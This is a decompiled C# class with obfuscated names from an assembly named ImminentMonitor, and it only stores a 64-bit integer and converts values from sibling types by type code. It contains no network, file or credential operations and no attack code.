// Decompiled with JetBrains decompiler
// Type: Class63
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using System;
using System.Runtime.CompilerServices;

internal sealed class Class63 : Class45
{
  private long long_0;

  public long method_2() => this.long_0;

  public void method_3(long long_1) => this.long_0 = long_1;

  [SpecialName]
  public override object vmethod_0() => (object) this.method_2();

  [SpecialName]
  public override void vmethod_1(object object_0)
  {
    switch (object_0)
    {
      case ulong long_1_1:
        this.method_3((long) long_1_1);
        break;
      case float long_1_2:
        this.method_3((long) long_1_2);
        break;
      case double long_1_3:
        this.method_3((long) long_1_3);
        break;
      default:
        this.method_3(Convert.ToInt64(object_0));
        break;
    }
  }

  public override Class45 vmethod_4()
  {
    Class63 class63 = new Class63();
    class63.method_3(this.long_0);
    class63.method_1(this.method_0());
    return (Class45) class63;
  }

  [SpecialName]
  public override int vmethod_2() => 3;

  public override Class45 vmethod_3(Class45 class45_0)
  {
    this.method_1(class45_0.method_0());
    switch (class45_0.vmethod_2())
    {
      case 0:
        this.method_3((long) ((Class51) class45_0).method_2());
        break;
      case 1:
        this.method_3((long) ((Class62) class45_0).method_2());
        break;
      case 2:
        this.method_3((long) ((Class67) class45_0).method_2());
        break;
      case 3:
        this.method_3(((Class63) class45_0).method_2());
        break;
      case 4:
        this.method_3((long) ((Class69) class45_0).method_2());
        break;
      case 5:
        this.method_3((long) (ulong) ((Class65) class45_0).method_2());
        break;
      case 7:
        this.method_3(Convert.ToInt64((object) ((Class59) class45_0).method_2()));
        break;
      case 9:
        this.method_3((long) ((Class46) class45_0).method_2());
        break;
      case 11:
        this.method_3((long) ((Class64) class45_0).method_2());
        break;
      case 14:
        this.method_3((long) ((Class70) class45_0).method_2());
        break;
      case 15:
        this.method_3((long) ((Class50) class45_0).method_2());
        break;
      case 16:
        this.method_3((long) ((Class48) class45_0).method_2());
        break;
      case 18:
        this.method_3((long) ((Class61) class45_0).method_2());
        break;
      case 20:
        this.method_3(Convert.ToInt64(((Class49) class45_0).method_2()));
        break;
      case 23:
        this.method_3((long) Convert.ToByte(((Class47) class45_0).method_2()));
        break;
      default:
        throw new ArgumentOutOfRangeException();
    }
    return (Class45) this;
  }
}
